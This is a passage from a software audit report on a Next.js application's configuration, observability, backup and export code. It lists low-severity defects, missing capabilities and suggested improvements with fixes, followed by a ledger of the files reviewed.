  (`AGENTS.md:67`). `automaticVercelMonitors` and the treeshake options are nested under a
  `webpack: { … }` key; this project builds with Turbopack under Next 16, and
  `automaticVercelMonitors` is documented as not working with App Router route handlers by the
  comment directly above it (`:60-61`).
- Trigger: every `next build`.
- Impact: source maps upload to one specific org/project regardless of which Sentry the
  operator connected, so a self-hosting operator's release artefacts are pushed at someone
  else's org (or fail with a confusing auth error), and the `SENTRY_AUTH_TOKEN` in
  `.env.sentry-build-plugin` is scoped to that org. The nested `webpack` options are dead
  configuration that reads as active tuning.
- Confidence: Confirmed for the hardcoding; Needs check for whether
  `withSentryConfig` honours the `webpack` sub-object in `@sentry/nextjs` 10 under Turbopack.
- Suggested fix: read `org`/`project` from `SENTRY_ORG`/`SENTRY_PROJECT` build-time env (they
  are already read by `migrateEnvSentry`) and skip source-map upload when unset; drop the
  `webpack` block or move its options to wherever the installed SDK version expects them, with
  a comment naming the version.

### F-763 [LOW] `tsconfig.json` includes two `.next` globs that `exclude` immediately removes

- Area: P
- Location: `tsconfig.json:36-37,45`
- What happens: `include` lists `.next/types/**/*.ts` and `.next/dev/types/**/*.ts`;
  `exclude` lists `.next`. Exclude filters include, so both entries are inert.
- Trigger: n/a.
- Impact: harmless but misleading — `.cursor/lessons-learned.md:82-85` records that these globs
  are exactly what broke `tsc` twice, and the file still carries them, so a reader cannot tell
  whether they are load-bearing. Next's `writeConfigurationDefaults` also re-adds them, which
  is presumably why they are still there; that is worth a comment.
- Confidence: Confirmed
- Suggested fix: remove both globs and add a one-line comment saying Next re-adds them and
  that the `exclude` entry is what neutralises them — or, if churn is the concern, keep them
  and add the comment.

### F-764 [LOW] `checkInternalOrigin` compares hosts but ignores the protocol

- Area: P
- Location: `lib/api/internal-origin.ts:51-81`
- What happens: the check compares `URL.host` (hostname plus explicit port) between
  `NEXT_PUBLIC_APP_URL` and `APP_URL`. Protocol is never compared.
- Trigger: `NEXT_PUBLIC_APP_URL=http://app.example` with
  `APP_URL=https://app.example` (or the reverse) in production.
- Impact: the boot assertion passes on a mismatched scheme, and both consumers named in the
  file's own header build URLs from it: the GitHub App Manifest callback
  (`lib/integrations/github-manifest.ts`) and static preview origins
  (`lib/preview/url.ts:16`). An `http://` preview origin means signed preview tokens travel in
  cleartext, and GitHub will reject an `http` callback — the "discovered days later by a user"
  failure the comment at `:89-93` says this check exists to prevent.
- Confidence: Confirmed
- Suggested fix: compare `protocol` as well as `host`, and additionally require `https:` when
  `NODE_ENV === 'production'`.

### F-765 [LOW] `formatRelativeTime` renders every future timestamp as "just now"

- Area: P
- Location: `lib/format-relative-time.ts:14-16`
- What happens: `seconds = Math.round((now - date) / 1000)`; a future date makes `seconds`
  negative, and the first branch is `seconds < 45 → 'just now'`. A timestamp ten days in the
  future is "just now".
- Trigger: clock skew between the database and the app, or any timestamp written by a host
  running ahead.
- Impact: a project whose `updatedAt` is in the future reads as freshly edited forever, which
  also puts it first in the "Last 14 days" bucket
  (`lib/projects/list-client.ts:73`). Skew becomes invisible instead of obvious.
- Confidence: Confirmed
- Suggested fix: handle `seconds < 0` explicitly — return `'just now'` only within a small
  tolerance (say 60 s) and something honest ("in the future") beyond it, so skew is visible.

### F-766 [LOW] `types/sandbox.ts` declares three globals for a subsystem that no longer exists

- Area: P
- Location: `types/sandbox.ts:15-29` (also `types/conversation.ts:12`)
- What happens: `declare global { var activeSandbox: any; var sandboxState: SandboxState; var
existingFiles: Set<string> }`, plus `SandboxFileCache`, `SandboxState` and a
  `sandboxId` field on conversation metadata.
- Trigger: n/a.
- Impact: the globals are ambient across the whole project, so `global.sandboxState` still
  typechecks anywhere — which is what lets `lib/morph-fast-apply.ts:119-121,220-228` read and
  write it without a compiler complaint (F-718). Removing the declarations would have surfaced
  that module as dead.
- Confidence: Confirmed
- Suggested fix: delete `types/sandbox.ts` and the `sandboxId` metadata field, then fix the
  compile errors that appear — they are the map of what is left to remove.

### F-767 [LOW] `types/archiver.d.ts` erases all typing for the ZIP export

- Area: P
- Location: `types/archiver.d.ts:1` (consumer `lib/export/archive.ts:6-24`)
- What happens: `declare module 'archiver';` makes the whole module `any`.
  `lib/export/archive.ts:6-9` then hand-writes a minimal `Archiver` interface and casts.
- Trigger: n/a.
- Impact: no compile-time check on the one code path that streams bytes to a user's browser,
  and the hand-written shape can drift from the real API silently. `@types/archiver` exists on
  npm.
- Confidence: Confirmed
- Suggested fix: add `@types/archiver` to `devDependencies`, delete the shim and the local
  interface.

### F-768 [LOW] `lib/i18n/user-copy.ts` hardcodes an unexplained banned brand word and has no production caller

- Area: P
- Location: `lib/i18n/user-copy.ts:3-4,13-18`
- What happens: `BANNED = /\bklarco\b/i` sits beside a Devanagari range check in a module named
  "non-English user copy". Neither `findNonEnglishUserCopy` nor `assertEnglishUserCopy` is
  imported anywhere in `app/`, `lib/`, `components/` or `scripts/`.
- Trigger: n/a.
- Impact: a copy guard that guards nothing, and a magic word no reader can evaluate — is
  "klarco" a competitor, a previous brand, a leaked placeholder? The comment
  (`:1`) explains the Devanagari rule and not the word.
- Confidence: Confirmed
- Suggested fix: either wire it into the generation/copy path it was written for (or a
  vitest guard over user-facing strings) with a comment naming why `klarco` is banned, or
  delete the module.

### F-769 [LOW] `design-system/MASTER.md` and two `public/` assets still carry Firecrawl branding

- Area: P
- Location: `design-system/MASTER.md:6`; `public/firecrawl.svg`; `public/firecrawl-logo`
- What happens: the design system's first product-chrome rule is
  "Keep the existing Firecrawl heat/orange brand (`#FA4500`)", and the repo ships a Firecrawl
  wordmark SVG plus a WebP with **no file extension** served at `/firecrawl-logo`.
  `public/firecrawl.svg:2` also embeds a 🔥 emoji in a `<text>` element with a camelCase
  `fontSize` attribute (invalid SVG; the attribute is `font-size`).
- Trigger: a designer or agent reading `design-system/MASTER.md` before touching chrome.
- Impact: the single source of truth for product styling instructs keeping another company's
  brand colour, while `.cursor/rules/navroop-product.mdc` requires branding as Navroop — so
  the two authorities disagree and the design doc wins for anyone who reads it first. The
  extensionless `public/firecrawl-logo` is also served with a guessed content type.
- Confidence: Confirmed
- Suggested fix: name the colour as Navroop's own token in `design-system/MASTER.md` (keeping
  the hex if that is the intended brand), delete the two Firecrawl assets or rename them with
  a correct extension, and drop the emoji from any shipped SVG.

### F-770 [LOW] `lib/export/collect.ts` takes two parameters it explicitly discards

- Area: P
- Location: `lib/export/collect.ts:20-27`
- What happens: `collectExportFiles` accepts `sandboxStatus` and, on the checkpoint path,
  `projectId`, then `void`s both at lines 26-27. `projectId` is still used on the
  no-checkpoint branch (`:42`); `sandboxStatus` is used nowhere.
- Trigger: n/a.
- Impact: callers compute and pass a `sandboxStatus` that cannot affect the result, and the
  signature advertises a sandbox dependency the export deliberately does not have (`:12-13`).
- Confidence: Confirmed
- Suggested fix: remove `sandboxStatus` from the input type and from every caller, and drop
  the `void` statements.

---

## GAP — missing capability

### F-780 [GAP] Nothing prunes the in-memory Sentry noise buckets

- Area: P
- Location: `lib/observability/noise.ts:44-48,143-155`
- `buckets` gains an entry per distinct event fingerprint and never loses one — only the
  `times` array inside each entry is filtered. `eventFingerprint` falls back to the exception
  message or `event.message` (`:105-109`), which routinely embeds ids, paths and interpolated
  values, so cardinality is effectively unbounded. `clearNoiseBuckets` exists for tests only.
  Needed: eviction (an LRU, or a sweep of entries whose `times` are all outside the window)
  and a ceiling with a logged warning when it is hit.

### F-781 [GAP] `verify-storage` reports orphaned objects and nothing acts on them

- Area: P
- Location: `lib/backup/verify.ts:58-62,74-82`
- Orphans (objects under `snapshots/` with no matching `Checkpoint`) are computed, embedded in
  the `BackupRun.detail` JSON and returned — but `ok` ignores them and no cron deletes them.
  They accumulate and are billed indefinitely. The full array is also serialised into
  `detail` with no cap, so a bucket with thousands of orphans writes a very large string into
  the database. Needed: a bounded orphan count in `detail`, a threshold that turns
  sustained orphan growth into an operator-visible signal, and a deliberate reclamation pass
  (or an explicit decision, recorded in code, that orphans are never deleted automatically).

### F-782 [GAP] `verify-storage` HEADs every checkpoint serially with no limit

- Area: P
- Location: `lib/backup/verify.ts:9-32`
- `findMany` loads every non-pruned checkpoint with a snapshot key — no `take` — and the loop
  awaits one `exists(key)` at a time. At a few thousand checkpoints that is a few thousand
  sequential S3 round trips inside one weekly cron invocation, which will exceed any
  request timeout long before it finishes, so the check silently stops being performed as the
  product grows. Needed: pagination, bounded concurrency, and a resumable cursor so a run that
  is cut short reports how far it got instead of failing wholesale.

### F-783 [GAP] `purge-projects` has no batch limit and its storage accounting is not transactional

- Area: P
- Location: `lib/projects/purge-deleted.ts:29-36,129-130`
- The daily purge loads every eligible project with all its checkpoints and assets and then
  performs, per project, a publish teardown, two `listKeys` calls and one `deleteObject` per
  key — serially, with no cap on projects per run. `adjustStorageBytes(-bytes)` runs _after_
  `prisma.project.delete`, so a failure between them permanently over-counts
  `Workspace.storageBytes` with no way to reconcile except `verify-storage`.
  Needed: a per-run project cap (the loop is already restart-safe — it reports `blocked` and
  retries next run), and either a transaction spanning the delete and the byte adjustment or a
  reconciliation that recomputes `storageBytes` from rows.

### F-784 [GAP] There is no dead-man's switch for the digest that reports every other cron

- Area: P
- Location: `lib/observability/system-checks.ts:15-17`
- The code names the hole precisely: `system-checks-digest` is the sender, so it cannot report
  its own silence, and "that needs an external dead-man's-switch ping". Nothing implements one.
  If the digest's schedule is removed or the endpoint starts 500ing, every stale cron becomes
  invisible at once — the single point of failure for all background-work monitoring.
  Needed: an outbound heartbeat to an external monitor on each digest run, and the monitor's
  URL in the settings registry.

### F-785 [GAP] `verify` does not run the secret scanner or Prettier

- Area: P
- Location: `lib/verify/orchestrator.ts:89-110` (steps), `.husky/pre-commit:23`,
  `.prettierrc.json`
- `scripts/secret-scan.ts` runs only from `.husky/pre-commit`, in `--staged` mode. A commit
  made with `--no-verify` (which `scripts/verify-bypass.ts` exists to log) is never scanned
  again — not by `pnpm run verify`, not by CI. Prettier likewise runs only via `lint-staged`,
  so formatting is enforced on staged files and never checked repo-wide.
  Needed: a tree-mode secret-scan step and a `prettier --check` step in the orchestrator, both
  fatal — with the ignore-list fix from F-729 first, or the tree-mode step will fail on other
  worktrees.

### F-786 [GAP] Edge runtime and middleware have no error reporting at all

- Area: P
- Location: `sentry.edge.config.ts:1-3` (imported by `instrumentation.ts:50-52`)
- The edge config is `export {}` with a comment explaining that the edge isolate cannot read
  `OBSERVABILITY_CONFIG_PATH`. The consequence is not stated: `proxy.ts` — the auth gate in
  front of every `/api` and `/preview-static` request — runs on edge, so a throw there is
  reported nowhere. A gate that fails is the highest-consequence failure in the system.
  Needed: an edge-safe DSN (a build-time `NEXT_PUBLIC_*` value would work, and is the same
  value F-703 needs) so edge and middleware errors are captured, or an explicit statement on
  `/admin/health` that they are not.

---

## IMPROVEMENT

### F-790 [IMPROVEMENT] `eslint.config.mjs` disables the four rules that would find this section's dead code

- Location: `eslint.config.mjs:10-11,18,21,23`
- `@typescript-eslint/no-unused-vars` and `no-explicit-any` are `off`, as are
  `react-hooks/exhaustive-deps`, `react-hooks/set-state-in-effect` and `prefer-const`. With
  `--max-warnings 0` the gate looks strict, but the rules most relevant to the dead exports and
  `any`-typed sandbox plumbing in this section are not running. `no-empty: 'error'` (`:15`) is
  well chosen and load-bearing — keep it. Suggest re-enabling `no-unused-vars` with an
  `argsIgnorePattern: '^_'`, since that alone flags `lib/export/collect.ts:26-27` and much of
  `config/app.config.ts`.

### F-791 [IMPROVEMENT] `knip.json` excludes the three directories with the most dead code

- Location: `knip.json:2`
- `ignore` covers `scripts/**`, `tests/**`, `e2e/**`. The eight orphaned `verify-*` scripts
  (F-721) live in the first. Suggest removing `scripts/**` and letting the report be noisy
  once, then fixing it.

### F-792 [IMPROVEMENT] No level filter on the structured logger

- Location: `lib/logger.ts:40-52`
- `log.debug` writes to stdout unconditionally in every environment. There is no
  `LOG_LEVEL`, and `appConfig.dev.enableDebugLogging` — which looks like the switch — is read
  nowhere (F-736). Suggest a `LOG_LEVEL` read once at module load, defaulting to `info` in
  production, and wiring the registry entry so it is changeable from `/admin/config`.

### F-793 [IMPROVEMENT] Hardcoded thresholds that belong in the settings registry

- Locations: `lib/observability/certs.ts:49` (14-day cert warning);
  `lib/backup/stale.ts:1-2` (48 h stale, 90-day restore test);
  `lib/runtime/data-dir.ts:38-41` (2 GB large-op floor, 20%/10% free-space thresholds, 1 h tmp
  age); `lib/observability/prune.ts:12` (30-day retention);
  `lib/observability/quota.ts:8` (3 h mismatch), `:64` (80% quota);
  `lib/email/rate-limit.ts:3-4` (20/hour); `lib/export/rate-limit.ts:2` (5/hour);
  `lib/password-reset/rate-limit.ts:2-3` (3/email, 10/IP);
  `lib/audit/bundle.ts:8-9` (300 KB / 150 KB budgets);
  `lib/audit/ai-review.ts:12-13,18` (10 files, 40k tokens, skip at 20 findings);
  `lib/validation/autofix-policy.ts:18` (2 attempts)
- Every one is an operator-tunable number compiled into the image. The project's own
  admin-settings rule says a value an operator might change without redeploying belongs in
  admin settings. `lib/settings/registry.ts` already makes that a one-entry change per value.

### F-794 [IMPROVEMENT] `lib/api/error-response.ts:31 fromUnknownError` is dead and would leak internals if used

- It returns `error.message` verbatim to the client with status 500. No caller exists (grepped).
  Suggest deleting it; if a generic 500 helper is wanted, it should log the real message and
  return a fixed string plus the request id.

### F-795 [IMPROVEMENT] `lib/ensure-member.ts` exports a hardcoded password that three files duplicate

- Location: `lib/ensure-member.ts:4-5,9` (duplicates at `prisma/seed.mjs:7,61` and
  `prisma/seed.ts:7,63`)
- `DEMO_MEMBER_PASSWORD = "ChangeMeNow123"` is a committed working credential. In `lib/` the
  only caller is gated behind `isDevQuickLoginEnabled()` (`auth.ts:31,47`), which is false in
  production — that part is sound. The risk is the duplication: `package.json:25,147` wires
  `db:seed` and Prisma's `seed` hook to `prisma/seed.mjs`, which creates
  `member@navroop.local` with that password **unconditionally**, with no env gate and no
  `NODE_ENV` check. An operator who runs `pnpm db:seed` against production creates a member
  account whose password is in the public repo, in an invite-only product. (`prisma/**` is
  another phase's scope; flagging the `lib/` constant and the `package.json` wiring that are
  in mine.) Suggest deleting the exported constant, having the seed generate a random password
  and print it once, and gating demo-member creation on a `SEED_DEMO_MEMBER=true` flag.
  `prisma/seed.ts` and `prisma/seed.mjs` are also two drifted copies of one seed, only one of
  which runs.

### F-796 [IMPROVEMENT] `lib/export/files.ts` drops oversized files from the ZIP silently

- Location: `lib/export/files.ts:32-37`; `lib/export/readme.ts:24`
- `filterExportFiles` removes any file over 10 MB with no record. The README the user receives
  names `node_modules`, `.git` and `.env` as omitted, not the size rule. Suggest listing
  skipped paths in the README (and in the API response) so the download is honest about what it
  is missing.

### F-797 [IMPROVEMENT] `lib/projects/persist-client.ts` sends every field under two names

- Location: `lib/projects/persist-client.ts:21-38`
- The payload carries `name`+`title`, `initialPrompt`+`prompt`, `thumbnailUrl`+`screenshot`,
  `generationStatus`+`status`. `lib/projects/http.ts:23-24,46-59` accepts both. The repo's
  clean-cutover rule says migrate every caller and delete the alias; this is the only client,
  so the cutover is a small change that would let `readGenerationInput` shrink to a single
  schema (F-743).

### F-798 [IMPROVEMENT] `scripts/smoke-test.ts` uses bare `fetch` in the two loops that matter

- Location: `scripts/smoke-test.ts:307-311,338-345` (contrast the `fetchOrNull` helper at
  `:93-99`)
- The file documents at `:8-12` that "checks are independent: a failing check records the
  failure and the run continues". The unauthenticated route probe and the cron bearer checks
  use raw `fetch`, so one connection reset mid-probe throws an unhandled rejection and kills
  the run with a Node stack trace — losing every result gathered so far. Suggest routing both
  through `fetchOrNull` and recording a null response as a failed probe. Separately, the probe
  fires every discovered method (including `POST`/`DELETE`) at a live deployment with sample
  ids and no pacing, which can trip the app's own login rate limiter before `checkSignIn` runs
  a few lines later.

### F-799 [IMPROVEMENT] CI sets `CI: '1'` and then calls `pnpm exec` twice

- Location: `.github/workflows/verify.yml:41,58-59`; `.github/workflows/nightly.yml:40,56-57`
- `.cursor/lessons-learned.md:77-80` records that `pnpm exec` runs a dependency-status check
  that can decide to purge `node_modules`, and that it aborts **only** because an agent shell
  has no TTY — with the explicit warning "Never set `CI=true` … that arms the deletion". Both
  workflows set `CI: '1'` and then run `pnpm exec prisma migrate deploy` and
  `pnpm exec playwright install`. A fresh `--frozen-lockfile` install makes the status check
  pass today, so this is latent rather than broken — but it is the one condition the lesson
  says never to combine. Suggest direct binary invocations
  (`node ./node_modules/prisma/build/index.js migrate deploy`,
  `node ./node_modules/playwright/cli.js install --with-deps chromium`), matching what
  `scripts/migrate-test-db.ts:83-88` already does.

---

## Unverified suspicions

Recorded because they are worth checking, not asserted:

- `lib/settings/*` may pass a secret's plaintext to `writeAudit` under a field name that
  `scrubValue` does not match (`lib/sentry/scrub.ts:13` matches key names only). I read the
  scrubber and `lib/audit/log.ts:104-105` but not the `setting.update` call site
  (`lib/settings/` is not in my scope). If it passes `{ key, value }`, the secret is stored in
  `AuditLog.after` in plaintext. **Worth checking first** of everything in this list.
- `lib/seo/html.ts:19-26` builds `new RegExp` with `[^>]+` followed by `[^>]*` in the same
  alternation and runs it over untrusted HTML; a long unterminated `<meta` attribute may
  backtrack quadratically. I did not construct a proof-of-concept.
- `docker-entrypoint.mjs:40,52,65` spawn `tsx` and `prisma` by bare name, relying on
  `npm install -g` in `Dockerfile:43`, which installs `tsx` **unpinned**. A future `tsx` major
  could break production boot; I did not verify which version resolves today.
- `lib/observability/store.ts:101-106` `listLatestCronRunPerName` has no `LIMIT` and relies on
  `DISTINCT ON`; with the retention prune in place the row count is bounded, but I did not
  confirm `pruneObservabilityHistory` is actually wired into the `thin-checkpoints` route
  (that route is another phase's scope).

---

## Files reviewed

`path — clean` or `path — F-0NN, …`. `not fully read` marks the twelve files and six digests
declared at the top.

```
.dockerignore — F-713
.env — F-714, F-734
.env.example — F-712, F-717, F-733, F-734
.env.local — F-714
.env.sentry-build-plugin — F-714, F-762
.gitattributes — clean
.github/workflows/nightly.yml — F-799
.github/workflows/verify.yml — F-721, F-799
.gitignore — clean
.husky/_/.gitignore — clean
.husky/_/applypatch-msg — clean (generated stub, not fully read)
.husky/_/commit-msg — clean (generated stub, not fully read)
.husky/_/h — clean
.husky/_/husky.sh — clean
.husky/_/post-applypatch — clean (generated stub, not fully read)
.husky/_/post-checkout — clean (generated stub, not fully read)
.husky/_/post-commit — clean (generated stub, not fully read)
.husky/_/post-merge — clean (generated stub, not fully read)
.husky/_/post-rewrite — clean (generated stub, not fully read)
.husky/_/pre-applypatch — clean (generated stub, not fully read)
.husky/_/pre-auto-gc — clean (generated stub, not fully read)
.husky/_/pre-commit — clean
.husky/_/pre-merge-commit — clean (generated stub, not fully read)
.husky/_/pre-push — clean (generated stub, not fully read)
.husky/_/pre-rebase — clean (generated stub, not fully read)
.husky/_/prepare-commit-msg — clean (generated stub, not fully read)
.husky/.gitattributes — clean
.husky/pre-commit — clean
.husky/pre-push — clean
.mcp.json — clean
.npmrc — F-700
.prettierignore — clean
.prettierrc.json — F-785
.vscode/settings.json — clean
atoms/sheets.ts — clean
colors.json — not fully read
config/app.config.ts — F-736, F-737
design-system/MASTER.md — F-769
docker-compose.dev.yml — F-753
docker-compose.yml — F-712, F-718, F-725
docker-entrypoint.mjs — F-704, F-715, F-747
Dockerfile — F-713, F-716
eslint.config.mjs — F-790
instrumentation-client.ts — F-703
instrumentation.ts — F-746
knip.json — F-721, F-791
lib/api/error-response.ts — F-758, F-794
lib/api/internal-origin.ts — F-725, F-764
lib/api/with-request.ts — clean
lib/audit/a11y.ts — F-705, F-751, F-759
lib/audit/actions.ts — F-705, F-759 (not fully read)
lib/audit/admin.ts — F-741
lib/audit/ai-review.ts — F-737, F-793
lib/audit/bundle.ts — F-705, F-793
lib/audit/findings.ts — F-705
lib/audit/fix-instruction.ts — clean
lib/audit/log.ts — F-744, F-757
lib/audit/recurring.ts — clean
lib/audit/scan.ts — F-705
lib/audit/static/dead-code.ts — F-705
lib/audit/static/dependencies.ts — F-705
lib/audit/static/index.ts — F-705
lib/audit/static/lint.ts — F-705
lib/audit/static/tool-fail.ts — clean
lib/audit/static/typescript.ts — F-705
lib/audit/types.ts — clean
lib/backup/admin.ts — F-711, F-715, F-722
lib/backup/alerts.ts — clean
lib/backup/assert.ts — F-701, F-715
lib/backup/boot.ts — F-715
lib/backup/client.ts — clean
lib/backup/copy.ts — F-711
lib/backup/db.ts — F-702, F-722, F-726, F-727
lib/backup/fingerprint.ts — F-715
lib/backup/index.ts — clean
lib/backup/restore.ts — F-701, F-726, F-727
lib/backup/retention.ts — F-702
lib/backup/runs.ts — F-722
lib/backup/stale.ts — F-793
lib/backup/verify.ts — F-708, F-781, F-782
lib/context-selector.ts — not fully read
lib/cron/auth.ts — clean
lib/cron/handle.ts — F-708
lib/cron/record.ts — F-708, F-724
lib/crypto.ts — F-715
lib/deploy/record.ts — F-746
lib/deploy/release.ts — F-733
lib/deploy/repo-files.ts — clean
lib/deploy/rollback.ts — F-707
lib/design/directions.ts — clean
lib/dev-quick-login.ts — clean
lib/edit-examples.ts — not fully read
lib/edit-intent-analyzer.ts — not fully read
lib/email.ts — clean
lib/email/client.ts — F-739
lib/email/rate-limit.ts — F-709, F-739, F-793
lib/email/templates/backup-failed.ts — clean
lib/email/templates/custom-domain-dns.ts — clean
lib/email/templates/custom-domain-failed.ts — clean
lib/email/templates/data-request.ts — clean
lib/email/templates/layout.ts — F-725
lib/email/templates/observability.ts — F-723
lib/email/templates/password-changed.ts — clean
lib/email/templates/password-reset.ts — clean
lib/email/templates/sandbox-credits.ts — F-736 (all three exports dead; no caller anywhere)
lib/email/templates/spend-alert.ts — clean
lib/email/templates/volume-low-space.ts — clean
lib/ensure-admin.ts — clean
lib/ensure-member.ts — F-795
lib/export/archive.ts — clean
lib/export/client.ts — clean
lib/export/collect.ts — F-770
lib/export/filename.ts — clean
lib/export/files.ts — F-796
lib/export/index.ts — clean
lib/export/rate-limit.ts — F-709, F-793
lib/export/readme.ts — F-719, F-796
lib/file-parser.ts — not fully read
lib/file-search-executor.ts — F-752
lib/format-relative-time.ts — F-754, F-765
lib/health/admin.ts — clean
lib/health/check.ts — F-733
lib/i18n/user-copy.ts — F-768
lib/icons.ts — clean
lib/legal/data-request.ts — clean
lib/legal/register.ts — clean
lib/legal/terms.ts — clean
lib/logger.ts — F-735, F-792
lib/migrate/safety.ts — F-704
lib/morph-fast-apply.ts — F-718
lib/notify.ts — clean
lib/observability/admin.ts — F-723, F-761
lib/observability/alerts.ts — F-739
lib/observability/boot.ts — clean
lib/observability/certs.ts — F-740, F-793
lib/observability/dsn.ts — clean
lib/observability/heartbeat.ts — clean
lib/observability/migrate-env.ts — F-733
lib/observability/noise.ts — F-780
lib/observability/prune.ts — F-793
lib/observability/quota.ts — F-723, F-793
lib/observability/runtime-config.ts — F-723, F-738
lib/observability/sentry-api.ts — F-723, F-724
lib/observability/startup.ts — F-739
lib/observability/store.ts — clean
lib/observability/system-checks.ts — F-708, F-717, F-784
lib/observability/track.ts — F-735
lib/observability/types.ts — clean
lib/observability/uptime.ts — F-724
lib/onboarding/examples.ts — clean
lib/onboarding/preferences.ts — clean
lib/password-reset/rate-limit.ts — F-709, F-793
lib/password-reset/service.ts — F-709, F-745
lib/password-reset/tokens.ts — clean
lib/password.ts — clean
lib/profile/actions.ts — F-742
lib/profile/schema.ts — F-742
lib/projects/actions.ts — F-743, F-759 (not fully read)
lib/projects/http.ts — F-743
lib/projects/last-code.ts — clean
lib/projects/list-client.ts — F-765
lib/projects/list-sql.ts — clean
lib/projects/lock-client.ts — clean
lib/projects/lock-http.ts — clean
lib/projects/lock.ts — F-730
lib/projects/pending-prompt.ts — clean
lib/projects/persist-client.ts — F-797
lib/projects/plan-client.ts — clean
lib/projects/plan-compensate.ts — clean
lib/projects/plan-retry.ts — clean
lib/projects/plan.ts — not fully read
lib/projects/presence.ts — F-742
lib/projects/prompt.ts — F-754
lib/projects/purge-deleted.ts — F-708, F-783
lib/projects/schema.ts — F-743 (stale "one of 6" comment at :17)
lib/projects/signed-out-submit.ts — clean
lib/projects/stars.ts — clean
lib/projects/start-from-prompt.ts — clean
lib/request-context.ts — clean
lib/request-id.ts — F-758
lib/runtime/data-dir.ts — F-726, F-727, F-728, F-793
lib/runtime/instance.ts — clean
lib/runtime/self.ts — clean
lib/runtime/shutdown.ts — F-747
lib/search/projects.ts — clean (silent FTS→ILIKE fallback at :50 noted, no finding filed)
lib/secret-scan.ts — F-729
lib/sentry/client.ts — F-703
lib/sentry/context.ts — F-758
lib/sentry/options.ts — F-735, F-738
lib/sentry/scrub.ts — F-757
lib/seo/actions.ts — F-706, F-759 (not fully read)
lib/seo/checks/content-structure.ts — clean
lib/seo/checks/indexing.ts — F-755
lib/seo/checks/metadata.ts — F-731
lib/seo/checks/open-graph.ts — F-731
lib/seo/checks/page-basics.ts — F-731
lib/seo/checks/robots.ts — F-706, F-756
lib/seo/checks/sitemap.ts — F-706
lib/seo/checks/structured-data.ts — clean
lib/seo/findings.ts — clean
lib/seo/fix-instruction.ts — F-731
lib/seo/html.ts — clean (ReDoS suspicion recorded, not filed)
lib/seo/lighthouse.ts — F-751
lib/seo/live.ts — F-706, F-755, F-759
lib/seo/scan.ts — clean
lib/seo/types.ts — clean
lib/seo/utility.ts — clean
lib/signals/collect.ts — not fully read
lib/signals/metrics.ts — F-732, F-760
lib/signals/range.ts — clean
lib/signals/score.ts — F-705, F-760
lib/stack-resolve.ts — clean
lib/stacks.ts — F-719, F-736
lib/stacks/routes.ts — clean
lib/stacks/templates/index.ts — clean
lib/stacks/templates/nextjs.ts — F-719
lib/stacks/templates/react.ts — F-719
lib/stacks/templates/shared.ts — F-719 (SANDBOX_ALLOWED_HOSTS / VITE_SERVER_BLOCK dead)
lib/stacks/templates/static-html.ts — F-719
lib/team/actions.ts — F-744
lib/team/http.ts — clean
lib/team/last-admin.ts — clean
lib/team/schema.ts — clean
lib/templates/actions.ts — not fully read
lib/templates/auth.ts — clean
lib/templates/categories.ts — clean
lib/templates/create.ts — clean
lib/templates/draft.ts — clean
lib/templates/http.ts — clean
lib/templates/index.ts — clean
lib/templates/public.ts — F-742
lib/templates/schema.ts — F-742
lib/templates/store.ts — F-748
lib/templates/summary.ts — clean
lib/templates/thumbnails.ts — clean
lib/templates/types.ts — clean
lib/templates/usage.ts — clean
lib/templates/visibility.ts — clean
lib/ui-ux-pro-max/build-design-brief.ts — not fully read
lib/usage-costs.ts — F-749, F-750
lib/usage-estimates.ts — F-750
lib/utils.ts — clean
lib/validation/autofix-policy.ts — F-793
lib/validation/build-check.ts — clean
lib/validation/fix-prompt.ts — clean
lib/validation/import-check.ts — clean
lib/validation/run-build-validation.ts — clean
lib/validation/settings.ts — clean
lib/workspace/sandbox-request.ts — clean (documents the removed subsystem)
LICENSE — clean
next-env.d.ts — clean
next.config.ts — F-703, F-762
package.json — F-711, F-716, F-721, F-795
packages/create-open-lovable/index.js — F-720
packages/create-open-lovable/lib/installer.js — F-720
packages/create-open-lovable/lib/prompts.js — F-720 (not fully read)
packages/create-open-lovable/package.json — F-720
packages/create-open-lovable/templates/e2b/.env.example — F-720 (not fully read)
packages/create-open-lovable/templates/e2b/README.md — F-720 (not fully read)
pnpm-workspace.yaml — F-700, F-716
postcss.config.mjs — clean
public/compressor.json — clean
public/file.svg — clean
public/firecrawl-logo — F-769
public/firecrawl.svg — F-769
public/globe.svg — clean
public/window.svg — clean
scripts/backfill-quality-signals.ts — F-732 (unbounded `findMany` at :61; un-`where`d
  `promptVersion.updateMany` at :52 leaves no active version if it dies mid-run)
scripts/backup-db.ts — F-711, F-714, F-726
scripts/check-destructive-migrations.ts — F-704
scripts/check-public-routes.ts — clean
scripts/copy-preview-vendor.mjs — F-710
scripts/ensure-test-db.ts — clean
scripts/migrate-test-db.ts — clean (the guard here is the model the other scripts should copy)
scripts/pre-migrate.ts — F-704, F-726
scripts/reconcile-jobs.ts — F-746
scripts/restore-db.ts — F-701, F-711, F-714, F-726
scripts/rollback.ts — F-707
scripts/secret-scan.ts — F-729, F-785
scripts/seed-e2e-account.ts — clean
scripts/smoke-test.ts — F-798
scripts/verify-bypass.ts — F-785
scripts/verify-plan-build-fn.ts — F-721 (not fully read)
scripts/verify-plan-build.mjs — F-721 (not fully read)
scripts/verify-plan-ui.ts — F-721
scripts/verify-projects-api.mjs — F-721 (not fully read)
scripts/verify-projects-data.mjs — F-721 (not fully read)
scripts/verify-stack-pipeline.mjs — F-721
scripts/verify-storage.ts — F-714, F-726, F-781, F-782
scripts/verify-usage-costs.mjs — F-721
scripts/verify-usage-http.mjs — F-721 (not fully read)
scripts/verify.ts — F-785 (no per-step timeout; whole output buffered in memory)
sentry.client.config.ts — F-703
sentry.edge.config.ts — F-786
sentry.server.config.ts — F-738
tailwind.config.ts — not fully read
tsconfig.json — F-763
types/archiver.d.ts — F-767
types/conversation.ts — F-766
types/file-manifest.ts — clean
types/next-auth.d.ts — clean
types/next-env.d.ts — clean
types/sandbox.ts — F-766
```

**Count: 303 files reviewed** (291 fully, 12 partially + 6 digests as declared at the top).
**88 entries:** 71 defects — 2 CRITICAL, 19 HIGH, 42 MEDIUM, 8 LOW — plus 7 GAP and
10 IMPROVEMENT. Verified: every scope path appears exactly once in the ledger, no duplicate
or out-of-range finding ids.
